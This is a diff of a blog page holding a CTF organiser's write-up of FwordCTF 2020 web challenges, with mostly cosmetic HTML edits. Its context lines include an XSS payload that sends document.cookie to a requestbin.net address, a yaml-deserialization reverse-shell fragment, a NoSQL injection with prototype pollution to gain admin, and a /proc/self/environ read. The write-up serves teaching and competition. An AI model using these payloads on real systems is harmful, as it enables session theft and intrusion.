@@ -643,17 +643,17 @@
       <p>Our team Fword organized FwordCTF 2020 with more than 900 teams and 1900 participants , I&rsquo;ve been in charge of managing the infrastructure and Web + Bash categories, we will discuss infrastructure stuffs in future articles and how to  deploy things as our platform got a maximum of 2mins down and tasks had 0 down time.</p>
 <p><img src="https://i.imgur.com/Mw8OoKF.png" alt="STATS"></p>
 <p>However in this article we will discuss the possible ways of solving my Web / Bash tasks.</p>
-<h2 id="pastaxss-5-solves-500pts-">PastaXSS (5 solves) 500pts</h2>
+<h2 id="pastaxss-5-solves-500pts">PastaXSS (5 solves) 500pts</h2>
 <p><img src="https://imgur.com/F4BHxkK.png" alt="TASK"></p>
 <p>This task was a symfony project and we were given the souce code (in fact all tasks had the source code attached to avoid any possible ways of guess).</p>
-<h3 id="enumeration-">Enumeration</h3>
+<h3 id="enumeration">Enumeration</h3>
 <p>When you visit the website we have a register/login page, after creating an account we can notice that we have the possibility to post a <strong>jutsu</strong> with markdown possibility.
 There is also a feature in the website that let us import a jutsu from a website, hmmm I smell some SSRF vector here. There is also a report admin page that only accepts
 <code>http://web1.fword.wtf/jutsu/{id}</code> .</p>
 <p><img src="https://imgur.com/XY4Rj5I.png" alt="HOME"></p>
 <p>Markdown in jutsu:</p>
 <p><img src="https://imgur.com/mUvo0j4.png" alt="TASK"></p>
-<h2 id="exploitation-">Exploitation</h2>
+<h2 id="exploitation">Exploitation</h2>
 <p>Taking a look at the source code, you can notice in this part that the web page is using some caching , things began to be interesting here (SSRF+caching can lead to some juicy results)</p>
 <p><strong>JutsusController.php</strong></p>
 <pre><code class="language-php">
@@ -713,7 +713,7 @@ the SSRF to communicate with Redis caching system ( you can know from the config
 <p><strong>FwordCTF{Y0u_Only_h4vE_T0_cH4in_4nd_Th1nk_w3ll}</strong></p>
 <p>There was an unintended solution that exploited a problem in the markdown parser (I contacted the developer to resolve this issue)</p>
 <p><code>![&lt;img src=&quot;#&quot; onerror=&quot;src='http://requestbin.net/r/12bfihl1?c='+document.cookie; this.onerror=null&quot;/&gt;](#){onerror=outerHTML=alt}</code></p>
-<h2 id="useless3-solves-500pts-">Useless(3 solves) 500pts</h2>
+<h2 id="useless3-solves-500pts">Useless(3 solves) 500pts</h2>
 <p><img src="https://imgur.com/r0HTsK7.png" alt="TASK"></p>
 <p>In this task we were given a flask project, when we open the website we can notice in the login page the possibility to login using github.After creating an account and signing in we don&rsquo;t see anything special.</p>
 <p><img src="https://imgur.com/O60WJr5.png" alt="TASK"></p>
@@ -752,7 +752,7 @@ def github_oauth(github_authbp,token):
 <p>The meaning of this code (for lazy people :p ) when a user completes the Oauth dance successfully for the first time he will be registered in the database in the User table and we can also notice that <strong>fwordadmin</strong> is the github account of the admin (this information will help us next).</p>
 <p>Now our goal is to login using fwordadmin account, there&rsquo;s something suspicious in the previous code, when you connect via github you don&rsquo;t need any password but indeed the user is still
 saved in the same table where regular registrations are stored so we have to wonder what password is set by default or is there some column to verify the login method (which is not the case).</p>
-<p>The User class confirms our statement, the default password is set to &quot;&rdquo;</p>
+<p>The User class confirms our statement, the default password is set to &quot;&quot;</p>
 <pre><code class="language-python">class User(UserMixin,Base):
     __tablename__ = 'users'
     id = Column(Integer, primary_key=True)
@@ -772,7 +772,7 @@ saved in the same table where regular registrations are stored so we have to won
 <pre><code>login: fwordadmin
 password: //
 </code></pre>
-<p>There is a check that removes special characters so the password will be interpreted as &quot;&rdquo; at the end.</p>
+<p>There is a check that removes special characters so the password will be interpreted as &quot;&quot; at the end.</p>
 <p>Now we have access to the admin panel that has a feature that parses docker-compose files (yaml file) so even without reading the source code we can know that is a yaml unsafe deserialization exploit.</p>
 <p>The vulnerable code:</p>
 <pre><code class="language-python">def parse(text):
@@ -803,7 +803,7 @@ print(&quot;[+] Shell Spawned, check your listener)
 
 </code></pre>
 <p>I hope you had fun solving this task and learned from it , i tried to inspire it from a project in my internship .</p>
-<h2 id="otaku-8-solves-500pts-">Otaku (8 solves) 500pts</h2>
+<h2 id="otaku-8-solves-500pts">Otaku (8 solves) 500pts</h2>
 <p><img src="https://imgur.com/GduvVgP.png" alt="TASK"></p>
 <p>This was a Node Js application with its source code as always (i tried to use all known languages in the web tasks xd), opening the website we have a simple login/register page and a home page.</p>
 <p><img src="https://imgur.com/4IZ3mAW.png" alt="TASK"></p>
@@ -863,7 +863,7 @@ newUser[&quot;isAdmin&quot;]=0;
 <p>Our goal is to set isAdmin to 1, the prototype pollution vulnerable part is parsing the result json object of NoSQL query, so if we chain the NoSQL injection with prototype
 pollution we will have the possibility to set isAdmin to 1, we can achieve this by injecting the following in anime field:</p>
 <blockquote>
-<p>brrr&rdquo;,&rdquo;   <strong>proto</strong>&rdquo; : {&ldquo;isAdmin&rdquo;:1}, &ldquo;aaaa&rdquo;:&ldquo;aaa</p>
+<p>brrr&quot;,&quot;   <strong>proto</strong>&quot; : {&ldquo;isAdmin&rdquo;:1}, &ldquo;aaaa&rdquo;:&ldquo;aaa</p>
 </blockquote>
 <p>W don&rsquo;t have to forget the whitespace before <code>__proto__</code> because mongo doesn&rsquo;t accept it by default but we can notice the usage of trim() so adding some whitespace will do the trick.</p>
 <p>Now we have admin access:</p>
@@ -880,12 +880,12 @@ path: /proc/self/environ
 </code></pre>
 <p>And Bingo we got our flag</p>
 <p><img src="https://imgur.com/DNO9m4H.png" alt="FLAG"></p>
-<h3 id="other-writeups-">Other Writeups</h3>
+<h3 id="other-writeups">Other Writeups</h3>
 <p>Super Guesser Team writeups, they solved all web challenges :D 
 <a href="https://github.com/Super-Guesser/ctf/tree/master/Fword%20CTF%202020/writeups" target="_blank" rel="noopener">LINK</a></p>
 <p>Hexion Team Otaku task writeup 
 <a href="https://github.com/om3r-v/CTF-solutions/tree/master/FwordCTF/otaku" target="_blank" rel="noopener">LINK</a></p>
-<h2 id="bash-category-">Bash Category</h2>
+<h2 id="bash-category">Bash Category</h2>
 <p>These category included some privesc and jail challenges , some really nice writeups were written by the teams that participated, so i&rsquo;ll put some links here (I&rsquo;m just lazy to write my own writeups):</p>
 <p><strong>JailBoss:</strong></p>
 <p>
@@ -902,7 +902,7 @@ path: /proc/self/environ
 <a href="https://github.com/s-3ntinel/writeups/blob/master/ctf/FwordCTF_2020/bash/BashIsFun/README.md" target="_blank" rel="noopener">Writeup 1</a></p>
 <p>
 <a href="https://github.com/Zarkrosh/ctf-writeups/tree/master/2020-FwordCTF#bash---bash-is-fun" target="_blank" rel="noopener">Writeup 2</a></p>
-<h2 id="source-code-">Source Code</h2>
+<h2 id="source-code">Source Code</h2>
 <p>You can visit this github repo where i&rsquo;ll publish all related things to FwordCTF 2020 ( I have already published the tasks source code )</p>
 <p>
 <a href="https://github.com/kahla-sec/FwordCTF-2020" target="_blank" rel="noopener">FwordCTF 2020</a></p>
@@ -1244,7 +1244,7 @@ path: /proc/self/environ
   
 
   <p class="powered-by">
-    © Ahmed Belkahla, 2020 &middot; 
+    © Ahmed Belkahla, 2021 &middot; 
 
     Powered by the
     <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
